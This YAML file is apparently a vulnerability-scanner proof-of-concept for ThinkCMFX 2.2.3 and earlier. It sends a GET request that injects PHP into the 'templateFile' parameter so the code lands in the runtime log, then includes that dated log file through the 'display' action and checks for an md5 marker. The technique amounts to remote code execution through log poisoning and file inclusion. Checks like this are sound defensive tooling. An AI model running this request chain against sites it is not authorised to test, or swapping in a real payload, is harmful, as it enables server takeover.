name: poc-yaml-thinkcmf-templatefile-fileinclude
binding: 685579f0-d3db-4594-8132-902420a38b5a
manual: true
detail:
    author: min(minrui.zhang@chaitin.com)
    links:
        - https://www.hacking8.com/bug-web/ThinkCMF/ThinkCMF-%E7%BC%93%E5%AD%98Getshell.html
    vulnerability:
        id: CT-530340
        level: high
    ThinkCMF: ThinkCMFX <=2.2.3
    info:
        - ThinkCMF X2.x缓存Getshell（display函数）
        - 前台权限
transport: http
set:
    date1: timeConvert(int(now()), "06_01_02")
    rand1: randomInt(800000000, 1000000000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /?a=display&templateFile=%3C?php%20echo%20md5({{rand1}});?%3E
            follow_redirects: false
        expression: "true"
    r1:
        request:
            cache: true
            method: GET
            path: /?a=display&templateFile=data/runtime/Logs/Portal/{{date1}}.log
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(rand1))))
expression: r0() && r1()
